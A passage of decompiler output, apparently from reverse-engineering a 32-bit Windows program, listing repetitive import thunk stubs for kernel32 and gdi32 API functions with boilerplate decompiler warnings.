                    // WARNING: Could not recover jumptable at 0x00406a04. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetCurrentProcessId();
  return DVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HANDLE __stdcall GetCurrentThread(void)

{
  HANDLE pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406a0c. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (HANDLE)GetCurrentThread();
  return pvVar1;
}



// WARNING: Exceeded maximum restarts with more pending

DWORD __stdcall GetCurrentThreadId(void)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406a14. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetCurrentThreadId();
  return DVar1;
}



// WARNING: Exceeded maximum restarts with more pending

int __stdcall
GetDateFormatA(LCID Locale,DWORD dwFlags,SYSTEMTIME *lpDate,LPCSTR lpFormat,LPSTR lpDateStr,
              int cchDate)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406a1c. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = GetDateFormatA();
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall
GetDiskFreeSpaceA(LPCSTR lpRootPathName,LPDWORD lpSectorsPerCluster,LPDWORD lpBytesPerSector,
                 LPDWORD lpNumberOfFreeClusters,LPDWORD lpTotalNumberOfClusters)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406a24. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = GetDiskFreeSpaceA();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

DWORD __stdcall GetFileAttributesA(LPCSTR lpFileName)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406a2c. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetFileAttributesA();
  return DVar1;
}



// WARNING: Exceeded maximum restarts with more pending

DWORD __stdcall
GetFullPathNameA(LPCSTR lpFileName,DWORD nBufferLength,LPSTR lpBuffer,LPSTR *lpFilePart)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406a34. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetFullPathNameA();
  return DVar1;
}



// WARNING: Exceeded maximum restarts with more pending

DWORD __stdcall GetLastError(void)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406a3c. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetLastError();
  return DVar1;
}



// WARNING: Exceeded maximum restarts with more pending

void __stdcall GetLocalTime(LPSYSTEMTIME lpSystemTime)

{
                    // WARNING: Could not recover jumptable at 0x00406a44. Too many branches
                    // WARNING: Treating indirect jump as call
  GetLocalTime();
  return;
}



// WARNING: Exceeded maximum restarts with more pending

int __stdcall GetLocaleInfoA(LCID Locale,LCTYPE LCType,LPSTR lpLCData,int cchData)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406a4c. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = GetLocaleInfoA();
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

DWORD __stdcall GetModuleFileNameA(HMODULE hModule,LPSTR lpFilename,DWORD nSize)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406a54. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetModuleFileNameA();
  return DVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)

{
  HMODULE pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406a5c. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = (HMODULE)GetModuleHandleA();
  return pHVar1;
}



// WARNING: Exceeded maximum restarts with more pending

FARPROC __stdcall GetProcAddress(HMODULE hModule,LPCSTR lpProcName)

{
  FARPROC pFVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406a64. Too many branches
                    // WARNING: Treating indirect jump as call
  pFVar1 = (FARPROC)GetProcAddress();
  return pFVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HANDLE __stdcall GetStdHandle(DWORD nStdHandle)

{
  HANDLE pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406a6c. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (HANDLE)GetStdHandle();
  return pvVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall
GetStringTypeExA(LCID Locale,DWORD dwInfoType,LPCSTR lpSrcStr,int cchSrc,LPWORD lpCharType)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406a74. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = GetStringTypeExA();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

void __stdcall GetSystemInfo(LPSYSTEM_INFO lpSystemInfo)

{
                    // WARNING: Could not recover jumptable at 0x00406a7c. Too many branches
                    // WARNING: Treating indirect jump as call
  GetSystemInfo();
  return;
}



// WARNING: Exceeded maximum restarts with more pending

DWORD __stdcall GetTempPathA(DWORD nBufferLength,LPSTR lpBuffer)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406a84. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetTempPathA();
  return DVar1;
}



// WARNING: Exceeded maximum restarts with more pending

LCID __stdcall GetThreadLocale(void)

{
  LCID LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406a8c. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = GetThreadLocale();
  return LVar1;
}



// WARNING: Exceeded maximum restarts with more pending

DWORD __stdcall GetTickCount(void)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406a94. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetTickCount();
  return DVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall GetVersionExA(LPOSVERSIONINFOA lpVersionInformation)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406a9c. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = GetVersionExA();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

UINT __stdcall GetWindowsDirectoryA(LPSTR lpBuffer,UINT uSize)

{
  UINT UVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406aa4. Too many branches
                    // WARNING: Treating indirect jump as call
  UVar1 = GetWindowsDirectoryA();
  return UVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HGLOBAL __stdcall GlobalAlloc(UINT uFlags,SIZE_T dwBytes)

{
  HGLOBAL pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406aac. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (HGLOBAL)GlobalAlloc();
  return pvVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HGLOBAL __stdcall GlobalFree(HGLOBAL hMem)

{
  HGLOBAL pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406ab4. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (HGLOBAL)GlobalFree();
  return pvVar1;
}



// WARNING: Exceeded maximum restarts with more pending

LPVOID __stdcall GlobalLock(HGLOBAL hMem)

{
  LPVOID pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406abc. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (LPVOID)GlobalLock();
  return pvVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HGLOBAL __stdcall GlobalHandle(LPCVOID pMem)

{
  HGLOBAL pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406ac4. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (HGLOBAL)GlobalHandle();
  return pvVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HGLOBAL __stdcall GlobalReAlloc(HGLOBAL hMem,SIZE_T dwBytes,UINT uFlags)

{
  HGLOBAL pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406acc. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (HGLOBAL)GlobalReAlloc();
  return pvVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall GlobalUnlock(HGLOBAL hMem)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406ad4. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = GlobalUnlock();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

void __stdcall InitializeCriticalSection(LPCRITICAL_SECTION lpCriticalSection)

{
                    // WARNING: Could not recover jumptable at 0x00406adc. Too many branches
                    // WARNING: Treating indirect jump as call
  InitializeCriticalSection();
  return;
}



// WARNING: Exceeded maximum restarts with more pending

void __stdcall LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection)

{
                    // WARNING: Could not recover jumptable at 0x00406ae4. Too many branches
                    // WARNING: Treating indirect jump as call
  LeaveCriticalSection();
  return;
}



// WARNING: Exceeded maximum restarts with more pending

HGLOBAL __stdcall LoadResource(HMODULE hModule,HRSRC hResInfo)

{
  HGLOBAL pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406aec. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (HGLOBAL)LoadResource();
  return pvVar1;
}



// WARNING: Exceeded maximum restarts with more pending

LPVOID __stdcall LockResource(HGLOBAL hResData)

{
  LPVOID pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406af4. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (LPVOID)LockResource();
  return pvVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall MoveFileA(LPCSTR lpExistingFileName,LPCSTR lpNewFileName)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406afc. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = MoveFileA();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

int __stdcall MulDiv(int nNumber,int nNumerator,int nDenominator)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406b04. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = MulDiv();
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HANDLE __stdcall OpenProcess(DWORD dwDesiredAccess,BOOL bInheritHandle,DWORD dwProcessId)

{
  HANDLE pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406b0c. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (HANDLE)OpenProcess();
  return pvVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall
ReadFile(HANDLE hFile,LPVOID lpBuffer,DWORD nNumberOfBytesToRead,LPDWORD lpNumberOfBytesRead,
        LPOVERLAPPED lpOverlapped)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406b14. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = ReadFile();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall ResetEvent(HANDLE hEvent)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406b1c. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = ResetEvent();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall SetEndOfFile(HANDLE hFile)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406b24. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = SetEndOfFile();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

UINT __stdcall SetErrorMode(UINT uMode)

{
  UINT UVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406b2c. Too many branches
                    // WARNING: Treating indirect jump as call
  UVar1 = SetErrorMode();
  return UVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall SetEvent(HANDLE hEvent)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406b34. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = SetEvent();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

DWORD __stdcall
SetFilePointer(HANDLE hFile,LONG lDistanceToMove,PLONG lpDistanceToMoveHigh,DWORD dwMoveMethod)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406b3c. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = SetFilePointer();
  return DVar1;
}



// WARNING: Exceeded maximum restarts with more pending

DWORD __stdcall SizeofResource(HMODULE hModule,HRSRC hResInfo)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406b44. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = SizeofResource();
  return DVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall TerminateProcess(HANDLE hProcess,UINT uExitCode)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406b4c. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = TerminateProcess();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

SIZE_T __stdcall VirtualQuery(LPCVOID lpAddress,PMEMORY_BASIC_INFORMATION lpBuffer,SIZE_T dwLength)

{
  SIZE_T SVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406b54. Too many branches
                    // WARNING: Treating indirect jump as call
  SVar1 = VirtualQuery();
  return SVar1;
}



// WARNING: Exceeded maximum restarts with more pending

DWORD __stdcall WaitForSingleObject(HANDLE hHandle,DWORD dwMilliseconds)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406b5c. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = WaitForSingleObject();
  return DVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall
WriteFile(HANDLE hFile,LPCVOID lpBuffer,DWORD nNumberOfBytesToWrite,LPDWORD lpNumberOfBytesWritten,
         LPOVERLAPPED lpOverlapped)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406b64. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = WriteFile();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall BitBlt(HDC hdc,int x,int y,int cx,int cy,HDC hdcSrc,int x1,int y1,DWORD rop)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406b6c. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = BitBlt();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HENHMETAFILE __stdcall CopyEnhMetaFileA(HENHMETAFILE hEnh,LPCSTR lpFileName)

{
  HENHMETAFILE pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406b74. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = (HENHMETAFILE)CopyEnhMetaFileA();
  return pHVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HBITMAP __stdcall CreateBitmap(int nWidth,int nHeight,UINT nPlanes,UINT nBitCount,void *lpBits)

{
  HBITMAP pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406b7c. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = (HBITMAP)CreateBitmap();
  return pHVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HBRUSH __stdcall CreateBrushIndirect(LOGBRUSH *plbrush)

{
  HBRUSH pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406b84. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = (HBRUSH)CreateBrushIndirect();
  return pHVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HBITMAP __stdcall CreateCompatibleBitmap(HDC hdc,int cx,int cy)

{
  HBITMAP pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406b8c. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = (HBITMAP)CreateCompatibleBitmap();
  return pHVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HDC __stdcall CreateCompatibleDC(HDC hdc)

{
  HDC pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406b94. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = (HDC)CreateCompatibleDC();
  return pHVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HBITMAP __stdcall
CreateDIBSection(HDC hdc,BITMAPINFO *lpbmi,UINT usage,void **ppvBits,HANDLE hSection,DWORD offset)

{
  HBITMAP pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406b9c. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = (HBITMAP)CreateDIBSection();
  return pHVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HBITMAP __stdcall
CreateDIBitmap(HDC hdc,BITMAPINFOHEADER *pbmih,DWORD flInit,void *pjBits,BITMAPINFO *pbmi,
              UINT iUsage)

{
  HBITMAP pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406ba4. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = (HBITMAP)CreateDIBitmap();
  return pHVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HFONT __stdcall CreateFontIndirectA(LOGFONTA *lplf)

{
  HFONT pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406bac. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = (HFONT)CreateFontIndirectA();
  return pHVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HPALETTE __stdcall CreateHalftonePalette(HDC hdc)

{
  HPALETTE pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406bb4. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = (HPALETTE)CreateHalftonePalette();
  return pHVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HPALETTE __stdcall CreatePalette(LOGPALETTE *plpal)

{
  HPALETTE pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406bbc. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = (HPALETTE)CreatePalette();
  return pHVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HPEN __stdcall CreatePenIndirect(LOGPEN *plpen)

{
  HPEN pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406bc4. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = (HPEN)CreatePenIndirect();
  return pHVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall DeleteDC(HDC hdc)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406bcc. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = DeleteDC();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall DeleteEnhMetaFile(HENHMETAFILE hmf)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406bd4. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = DeleteEnhMetaFile();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall DeleteObject(HGDIOBJ ho)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406bdc. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = DeleteObject();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall GdiFlush(void)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406be4. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = GdiFlush();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

LONG __stdcall GetBitmapBits(HBITMAP hbit,LONG cb,LPVOID lpvBits)

{
  LONG LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406bec. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = GetBitmapBits();
  return LVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall GetCurrentPositionEx(HDC hdc,LPPOINT lppt)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406bfc. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = GetCurrentPositionEx();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

UINT __stdcall GetDIBColorTable(HDC hdc,UINT iStart,UINT cEntries,RGBQUAD *prgbq)

{
  UINT UVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406c04. Too many branches
                    // WARNING: Treating indirect jump as call
  UVar1 = GetDIBColorTable();
  return UVar1;
}



// WARNING: Exceeded maximum restarts with more pending

int __stdcall
GetDIBits(HDC hdc,HBITMAP hbm,UINT start,UINT cLines,LPVOID lpvBits,LPBITMAPINFO lpbmi,UINT usage)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406c0c. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = GetDIBits();
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

int __stdcall GetDeviceCaps(HDC hdc,int index)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406c14. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = GetDeviceCaps();
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

UINT __stdcall GetEnhMetaFileBits(HENHMETAFILE hEMF,UINT nSize,LPBYTE lpData)

{
  UINT UVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406c1c. Too many branches
                    // WARNING: Treating indirect jump as call
  UVar1 = GetEnhMetaFileBits();
  return UVar1;
}



// WARNING: Exceeded maximum restarts with more pending

UINT __stdcall GetEnhMetaFileHeader(HENHMETAFILE hemf,UINT nSize,LPENHMETAHEADER lpEnhMetaHeader)

{
  UINT UVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406c24. Too many branches
                    // WARNING: Treating indirect jump as call
  UVar1 = GetEnhMetaFileHeader();
  return UVar1;
}



// WARNING: Exceeded maximum restarts with more pending

UINT __stdcall
GetEnhMetaFilePaletteEntries(HENHMETAFILE hemf,UINT nNumEntries,LPPALETTEENTRY lpPaletteEntries)

{
  UINT UVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406c2c. Too many branches
                    // WARNING: Treating indirect jump as call
  UVar1 = GetEnhMetaFilePaletteEntries();
  return UVar1;
}



// WARNING: Exceeded maximum restarts with more pending

int __stdcall GetObjectA(HANDLE h,int c,LPVOID pv)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406c34. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = GetObjectA();
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

UINT __stdcall GetPaletteEntries(HPALETTE hpal,UINT iStart,UINT cEntries,LPPALETTEENTRY pPalEntries)

{
  UINT UVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406c3c. Too many branches
                    // WARNING: Treating indirect jump as call
  UVar1 = GetPaletteEntries();
  return UVar1;
}



// WARNING: Exceeded maximum restarts with more pending

COLORREF __stdcall GetPixel(HDC hdc,int x,int y)

{
  COLORREF CVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406c44. Too many branches
                    // WARNING: Treating indirect jump as call
  CVar1 = GetPixel();
  return CVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HGDIOBJ __stdcall GetStockObject(int i)

{
  HGDIOBJ pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406c4c. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (HGDIOBJ)GetStockObject();
  return pvVar1;
}



// WARNING: Exceeded maximum restarts with more pending

UINT __stdcall GetSystemPaletteEntries(HDC hdc,UINT iStart,UINT cEntries,LPPALETTEENTRY pPalEntries)

{
  UINT UVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406c54. Too many branches
                    // WARNING: Treating indirect jump as call
  UVar1 = GetSystemPaletteEntries();
  return UVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall GetTextMetricsA(HDC hdc,LPTEXTMETRICA lptm)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406c5c. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = GetTextMetricsA();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

UINT __stdcall
GetWinMetaFileBits(HENHMETAFILE hemf,UINT cbData16,LPBYTE pData16,INT iMapMode,HDC hdcRef)

{
  UINT UVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406c64. Too many branches
                    // WARNING: Treating indirect jump as call
  UVar1 = GetWinMetaFileBits();
  return UVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall
MaskBlt(HDC hdcDest,int xDest,int yDest,int width,int height,HDC hdcSrc,int xSrc,int ySrc,
       HBITMAP hbmMask,int xMask,int yMask,DWORD rop)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406c6c. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = MaskBlt();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall MoveToEx(HDC hdc,int x,int y,LPPOINT lppt)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406c74. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = MoveToEx();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall PatBlt(HDC hdc,int x,int y,int w,int h,DWORD rop)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406c7c. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = PatBlt();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall PlayEnhMetaFile(HDC hdc,HENHMETAFILE hmf,RECT *lprect)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406c84. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = PlayEnhMetaFile();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

UINT __stdcall RealizePalette(HDC hdc)

{
  UINT UVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406c8c. Too many branches
                    // WARNING: Treating indirect jump as call
  UVar1 = RealizePalette();
  return UVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HGDIOBJ __stdcall SelectObject(HDC hdc,HGDIOBJ h)

{
  HGDIOBJ pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406c94. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (HGDIOBJ)SelectObject();
  return pvVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HPALETTE __stdcall SelectPalette(HDC hdc,HPALETTE hPal,BOOL bForceBkgd)

{
  HPALETTE pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406c9c. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = (HPALETTE)SelectPalette();
  return pHVar1;
}



// WARNING: Exceeded maximum restarts with more pending

COLORREF __stdcall SetBkColor(HDC hdc,COLORREF color)

{
  COLORREF CVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406ca4. Too many branches
                    // WARNING: Treating indirect jump as call
  CVar1 = SetBkColor();
  return CVar1;
}



// WARNING: Exceeded maximum restarts with more pending

int __stdcall SetBkMode(HDC hdc,int mode)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406cac. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = SetBkMode();
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

UINT __stdcall SetDIBColorTable(HDC hdc,UINT iStart,UINT cEntries,RGBQUAD *prgbq)

{
  UINT UVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406cbc. Too many branches
                    // WARNING: Treating indirect jump as call
  UVar1 = SetDIBColorTable();
  return UVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HENHMETAFILE __stdcall SetEnhMetaFileBits(UINT nSize,BYTE *pb)

{
  HENHMETAFILE pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406cc4. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = (HENHMETAFILE)SetEnhMetaFileBits();
  return pHVar1;
}



// WARNING: Exceeded maximum restarts with more pending

int __stdcall SetROP2(HDC hdc,int rop2)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406ccc. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = SetROP2();
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

COLORREF __stdcall SetTextColor(HDC hdc,COLORREF color)

{
  COLORREF CVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406cdc. Too many branches
                    // WARNING: Treating indirect jump as call
  CVar1 = SetTextColor();
  return CVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HENHMETAFILE __stdcall
SetWinMetaFileBits(UINT nSize,BYTE *lpMeta16Data,HDC hdcRef,METAFILEPICT *lpMFP)

{
  HENHMETAFILE pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406ce4. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = (HENHMETAFILE)SetWinMetaFileBits();
  return pHVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall
StretchBlt(HDC hdcDest,int xDest,int yDest,int wDest,int hDest,HDC hdcSrc,int xSrc,int ySrc,int wSrc
          ,int hSrc,DWORD rop)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406cec. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = StretchBlt();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall UnrealizeObject(HGDIOBJ h)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00406cf4. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = UnrealizeObject();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

DWORD __stdcall CharLowerBuffA(LPSTR lpsz,DWORD cchLength)

{
  DWORD DVar1;
  
